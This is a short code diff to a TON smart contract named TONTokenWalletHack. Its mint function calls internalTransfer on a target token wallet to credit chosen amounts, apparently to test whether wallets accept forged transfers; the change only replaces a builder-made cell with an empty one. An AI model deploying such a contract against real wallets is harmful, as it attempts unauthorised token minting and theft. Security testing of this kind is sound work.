@@ -18,7 +18,7 @@ contract TONTokenWalletHack {
 
     function mint(address to, uint128 tokens, uint128 grams) external view {
         tvm.accept();
-        TvmBuilder builder;
-        ITONTokenWallet(to).internalTransfer{value: grams, bounce: false}(tokens, wallet_public_key, owner_address, address(this), false, builder.toCell());
+        TvmCell empty;
+        ITONTokenWallet(to).internalTransfer{value: grams, bounce: false}(tokens, wallet_public_key, owner_address, address(this), false, empty);
     }
 }
